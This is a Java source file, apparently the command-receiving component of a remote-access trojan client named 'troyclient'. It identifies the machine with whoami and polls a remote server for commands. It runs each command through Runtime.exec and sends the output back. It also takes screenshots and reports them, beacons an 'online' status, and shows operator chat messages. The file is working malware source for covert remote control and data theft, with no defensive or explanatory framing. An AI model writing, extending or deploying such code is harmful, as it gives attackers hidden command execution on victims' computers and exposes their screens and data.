package ch.lebois.troyclient.functions;

import ch.lebois.troyclient.chat.Chat;
import ch.lebois.troyclient.service.GetContext;
import ch.lebois.troyclient.service.Sender;
import ch.lebois.troyclient.service.WebHandler;
import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.util.ArrayList;

public class CommandReciver {

    private WebHandler webHandler;

    public CommandReciver() {
        GetContext.CLIENT_NAME = execute("whoami").get(1).replace("\\", "-");
        webHandler = new WebHandler(GetContext.URL + "/command/" + GetContext.CLIENT_NAME);
        GetContext.SENDER = new Sender();
//        ArrayList<String> s = execute("wmic os get caption");
//        GetContext.SENDER.send("os", s.get(3));
    }

    public void readCommands() {
        GetContext.SENDER.send("online", "");
        try {
            String left = webHandler.getContent()
                    .split("id=\"commands\">")[1].split("</pre>")[0];

            String[] commands = left.replace("\\r", "").split("\\n");
            for (String command : commands) {
                try {
                    switch (command.toLowerCase()) {
                        case "screenshot":
                            GetContext.SENDER.send("screen", "Screenshot taken '" + Screenshot.takeScreenshot() + "'");
                            break;
                        case "cmd":
                        case "bash":
                        case "yes":
                            GetContext.SENDER.send("error", "Command '" + command + "' not allowed");
                            break;
                        case "clear":
                            for (int i = 27; i != 0; i--) {
                                GetContext.SENDER.send("commandout", "");
                            }
                            break;
                        default:
                            if (command.contains("msg")) {
                                Chat chat = Chat.getInstance();
                                chat.addMessage("Hermann: " + command.substring(6));
                                execute(command);
                                GetContext.SENDER.send("message", "CHAT - Hermann: " + command.substring(6));
                            } else {
                                executeFinalCommand(command);
                            }
                            break;
                    }

                } catch (NullPointerException e) {
                    e.printStackTrace();
                }
            }
        } catch (NullPointerException | IndexOutOfBoundsException e) {
            e.printStackTrace();
        }
    }

    private void executeFinalCommand(String command) {
        try {
            if (!command.equals("")) {
                for (String out : execute(command)) {
                    GetContext.SENDER.send("commandout", out);
                }
            }
        } catch (NullPointerException e) {
            e.printStackTrace();
            GetContext.SENDER.send("errorout", "No command '" + command + "' found");
        }
    }


    private ArrayList<String> execute(String command) {

        ArrayList<String> output = new ArrayList<>();
        try {
            Runtime rt = Runtime.getRuntime();
            String[] commands = command.split(" ");
            Process proc = rt.exec(commands);

            BufferedReader stdInput = new BufferedReader(new InputStreamReader(proc.getInputStream()));
            BufferedReader stdError = new BufferedReader(new InputStreamReader(proc.getErrorStream()));

            output.add(System.getProperty("user.dir") + " $ " + command);

            String s;
            while ((s = stdInput.readLine()) != null) {
                output.add(s);
            }

            while ((s = stdError.readLine()) != null) {
                output.add(s);
            }
        } catch (IOException e) {
            return null;
        }
        return output;
    }
}
